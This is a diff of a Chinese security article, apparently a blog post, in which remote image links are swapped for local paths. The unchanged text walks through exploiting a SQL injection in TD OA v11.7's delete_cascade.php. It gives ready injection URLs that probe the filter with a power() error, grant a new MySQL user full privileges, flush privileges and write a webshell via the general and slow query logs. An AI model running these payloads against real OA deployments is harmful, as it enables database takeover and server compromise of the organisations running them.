@@ -65,39 +65,39 @@ TD OA v11.7 版本
 
 此文件是需要登录后才能访问的，首先判断变量 $condition_cascade 是否为空，然后将 \'替换为'后赋值给 $query 变量，然后直接带入 exequery() 函数中执行，而变量 $condition_cascade 通过程序本身的变量覆盖漏洞进行赋值即可
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5uFFD5e6bTbZkP963kGeWw9k4clwWUtu1BGsh56ToLECsAbzN95oF9hOicbnooh51np8UibUicOd5aQ/640?wx_fmt=png)
+![](../../.resource/remote/ec774840c24a61f75043a0d4a1039232041de08df72fe5a97367c023d6d9dd4c.png)
 
 跟进 exequery() 函数：/inc/conn/php 36-45 行
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5uFFD5e6bTbZkP963kGeWwa13aBkJPXX4Zibj2DagDwu8z5oC7lfvYQ4aT1mDibN6zX4oHYWhAM48A/640?wx_fmt=png)
+![](../../.resource/remote/65a6e1386f463a125937cdf0fc570502c0a8cb05072cd5b6ef6714e0fc234d50.png)
 
 如果执行错误会调用 PrintError() 函数进行错误信息输出
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5uFFD5e6bTbZkP963kGeWwziaEiaI04BDIOPUbe9ia2ykmEaL3cxAraZ2zoXPHyqicCZ2CIlSgKW3vNg/640?wx_fmt=png)
+![](../../.resource/remote/a5d7e085645c1400db9f0aa25af372182574f8215fb40dbf13dae2cf138a7c6c.png)
 
 然后又调用 db_query() 函数：/inc/conn/php 47-70 行
 
 首先对传入的 $Q 进行字符串替换，然后带入 sql_injection() 函数执行，最后直接调用原生的 mysql_query() 函数对 sql 语句进行执行
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5uFFD5e6bTbZkP963kGeWwXaexRvYLf5Eg2DbvPEnx1NrtjhGpwciaLyOW11oR02WsJDcKaNpiaeaA/640?wx_fmt=png)
+![](../../.resource/remote/d95b4f5b0dc6a12df1b2166ff218ee948e08aae28192ae16bd2df1efcee7aa53.png)
 
 继续跟进 sql_injection() 函数：/inc/conn/php 110-187 行
 
 首先还是对传入的参数进行一些字符串的替换，以及正则匹配替换，这些影响不大，我们接着往后看
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5uFFD5e6bTbZkP963kGeWwxX5D4I7ibNvKuZ6lFN8SzVD2ibv5SEUgt6g6qOTyonjnOxcJPd3ibd3PA/640?wx_fmt=png)
+![](../../.resource/remote/85a5b88923963827dd580f2815c94126a6340822042e005b6c8e7eda1bb9e7c7.png)
 
 153 行开始，通过一系列的正则匹配，对传入的 sql 语句进行判断并过滤，一些报错注入使用的函数、联合查询函数、以及写文件的函数等等都进行了黑名单过滤，如果满足任意一个 if 判断就会将 $fail 设为 true，但是 if、substr 等函数并没有过滤掉，所以还是可以进行盲注判断的
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5uFFD5e6bTbZkP963kGeWwqUaJCYrkDialU46JiazgzIVZZTYxjfmGklbpTOTzj5uRibhz2LuHdxQJQ/640?wx_fmt=png)
+![](../../.resource/remote/f350b7afd4945ec300235f0b725b7807aeb439e5a6317c7e2d2615f08b88e9c1.png)
 
 如果触发了过滤代码，就会执行以下代码，并 exit 退出程序
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5uFFD5e6bTbZkP963kGeWwFcg6t3ibunHG7XciadPuEukbx1iaVwkjzljrYkJVkIthomT8JCPAg2EyQ/640?wx_fmt=png)
+![](../../.resource/remote/1a4e5a216afa6766c5ba8b83ecc432aa8d9d832a8278620728f54b25f665aebd.png)
 
 还可以利用 mysql 中的冷门函数，使 sql 语句执行时就会报错，从而使程序调用 **PrintError()** 函数进行报错信息的输出，而执行成功会输出下面的信息，通过两次执行语句返回的信息不同判断注入是否存在
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5uFFD5e6bTbZkP963kGeWwKuuxdHseC6NMb9icyHYxxJmsyUPpAZQicCLLiavt2T97pBak380Ktc0iaQ/640?wx_fmt=png)
+![](../../.resource/remote/9eb600987d537cde7223d438db428313b80c49567d5f526dc470fd748fbf6246.png)
 
 例如：
 
@@ -107,7 +107,7 @@ select if(0,power(9999,99),2)select if(1,power(9999,99),2)
 
 如果条件为 TRUE 则执行 power(9999,99)，如果条件为 FALSE 则返回 2，而 power() 函数是返回 9999 的 99 次方，当执行会报如下错误：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5uFFD5e6bTbZkP963kGeWwkmIkGjJYRBZcBk49tu6iabIpTbBv3PrNE0OmH43UjkUKL7fiaVb9BIEg/640?wx_fmt=png)
+![](../../.resource/remote/2e68aae58e9a661d98ac916fea3c7ec642a9d480c4b2e140b0ba98fa9406b2e0.png)
 
 当成功判断注入存在后，因为漏洞点是可以执行任意 sql 语句的，所以我们可以通过程序本身 mysql 用户权限高的先决条件进行深入的利用
 
@@ -121,7 +121,7 @@ http://192.168.136.148:8081/general/hr/manage/query/delete_cascade.php?condition
 
 执行成功会返回如下信息：  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5uFFD5e6bTbZkP963kGeWwwfyicp4FI8ngibtfCl7wtmicCSL0FxgmpnRyTfPaYS0v88zGxC8fBPXFg/640?wx_fmt=png)
+![](../../.resource/remote/970e10d28509478100582c763df321ed7ccdfeff5386b00082f962ad9dbabde3.png)
 
 ```
 http://192.168.136.148:8081/general/hr/manage/query/delete_cascade.php?condition_cascade=select if(1,power(9999,99),2);
@@ -129,7 +129,7 @@ http://192.168.136.148:8081/general/hr/manage/query/delete_cascade.php?condition
 
 执行报错则返回：  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5uFFD5e6bTbZkP963kGeWwx25MDWc2oIcGyKmgjzhwBVVCAic67zJicic762flsxmCcSRo1pKpBqq0Q/640?wx_fmt=png)
+![](../../.resource/remote/2a4dce6d563a2c27d3bd8f5e6d1cf62011d9bfaee0b7906a7ec52a24a15bfee4.png)
 
 根据两次执行返回结果的不同，可以判断注入存在
 
@@ -139,11 +139,11 @@ http://192.168.136.148:8081/general/hr/manage/query/delete_cascade.php?condition
 http://192.168.136.148:8081/general/hr/manage/query/delete_cascade.php?condition_cascade=grant all privileges ON mysql.* TO 'test111'@'%' IDENTIFIED BY 'test111@123' WITH GRANT OPTION
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5uFFD5e6bTbZkP963kGeWwM2mZYXa57CQpexWRiboWnZfLZzYIbhD0icYy89oGI7iazn1iaV6Xg7M0uw/640?wx_fmt=png)
+![](../../.resource/remote/e5cd659d7a9300eef6ba4f6590c05ecbcd93c6cf9f9e8fb9dcfcdc402112630a.png)
 
 然后利用添加的用户 test111 远程连接 mysql，注意默认端口为 3336
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5uFFD5e6bTbZkP963kGeWwQp60a2wrQK0MJmNuHe9CPezfhA9hxCiaib27HVzNhbAqibBErLdj7DKkQ/640?wx_fmt=png)
+![](../../.resource/remote/6a9f6622671576761490c9370d612398418d14aae54c13af5c5dfd2c4ec73460.png)
 
 给新添加的 test111 用户添加对应的权限：
 
@@ -153,7 +153,7 @@ UPDATE `mysql`.`user` SET `Password` = '*5ADFDA524177A8EB24D7671EF80A46F95C68D4E
 
 如果需要改用户名和密码的话需要对相应字段进行更改，Binary(7) 中的数值根据字符串长度更改  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5uFFD5e6bTbZkP963kGeWwNMTBzJUiazvSSNpmTblAlZibhI5bE8scJmaibXCgWd5zibKQzPryhRywKQ/640?wx_fmt=png)
+![](../../.resource/remote/ac1e82ed098bebc8217fe71c261d0095d552a4f030284918077b9bdac340d67a.png)
 
 3、用注入点刷新权限，因为新添加的用户是没有权限进行刷新的：
 
@@ -161,11 +161,11 @@ UPDATE `mysql`.`user` SET `Password` = '*5ADFDA524177A8EB24D7671EF80A46F95C68D4E
 http://192.168.136.148:8081/general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5uFFD5e6bTbZkP963kGeWw6mRSpwO2ibDwvy6Rgg3EWibToiceEZVbIXKvmQicbu9uW6CEgktpmrU4sw/640?wx_fmt=png)
+![](../../.resource/remote/1c1b3261f327b38dc0b8d942c02c1bf5da432850abd35a0ceb8af4f83adaa262.png)
 
 执行完之后会提示：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5uFFD5e6bTbZkP963kGeWwDkHGxUASJqDpG7NtgPMJmWaAFrot5yTzQJPgTAic82r88xukxhFicm7w/640?wx_fmt=png)
+![](../../.resource/remote/43f3469360fcab2eab276efa7669003890e18ed3d92e9259de1811ae8a852888.png)
 
 重新执行一下添加用户的命令即可：
 
@@ -173,7 +173,7 @@ http://192.168.136.148:8081/general/hr/manage/query/delete_cascade.php?condition
 http://192.168.136.148:8081/general/hr/manage/query/delete_cascade.php?condition_cascade=grant all privileges ON mysql.* TO 'test111'@'%' IDENTIFIED BY 'test111@123' WITH GRANT OPTION
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5uFFD5e6bTbZkP963kGeWwM2mZYXa57CQpexWRiboWnZfLZzYIbhD0icYy89oGI7iazn1iaV6Xg7M0uw/640?wx_fmt=png)
+![](../../.resource/remote/e5cd659d7a9300eef6ba4f6590c05ecbcd93c6cf9f9e8fb9dcfcdc402112630a.png)
 
 4、通过日志写 shell：
 
@@ -183,7 +183,7 @@ http://192.168.136.148:8081/general/hr/manage/query/delete_cascade.php?condition
 select @@basedir
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5uFFD5e6bTbZkP963kGeWwGscW6WVHpXAB2q4mDHwPROR7LAM2tiaks09N5ibvotqM716VRykW6JHA/640?wx_fmt=png)
+![](../../.resource/remote/805a1be37a9f1636752af3a119f9e5a59e5eea3bf5f02040cd9a90b8690b8f21.png)
 
 那么可以得出 web 根目录为：
 
@@ -198,11 +198,11 @@ select '';
 show variables like '%general%';
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5uFFD5e6bTbZkP963kGeWw414fJY0LFFc5oSESNibD8fIT7yu0M71osZBtLsS44jucFFFmPEOdbdQ/640?wx_fmt=png)
+![](../../.resource/remote/9fd74c7e583c0a2c1e3ef8f5e4322eee1c42080eb83d86776cab298067e84d36.png)
 
 连接 webshell：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ehibzaP4CvW5uFFD5e6bTbZkP963kGeWw5wrCibjy07XVVt9ycWJnFQVUY4Ah3kZM0XAPoibJGebWx28ia1kH70umg/640?wx_fmt=png)
+![](../../.resource/remote/5df1741d94deaa3f883e65c9b8511b5be356d6b58fa3e543d21b16fc2d80040c.png)
 
 ②通过慢查询日志写 shell，步骤类似：
 
@@ -220,7 +220,7 @@ select '' or sleep(11);
 
 **点个赞和在看吧，欢迎转发！**
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/ehibzaP4CvW5hb2Px7LJVkWEktazM0liacYxsJOVsyUz8lx6MSWyGTmJyJsPsgj9sOSueI5JRuQLTCPW5njR68aA/640?wx_fmt=gif)
+![](../../.resource/remote/8ba6e8f17ebea2ffea9a9926b2e34dc16504fced334a973803836f728906eed0.gif)
 
 ---
 
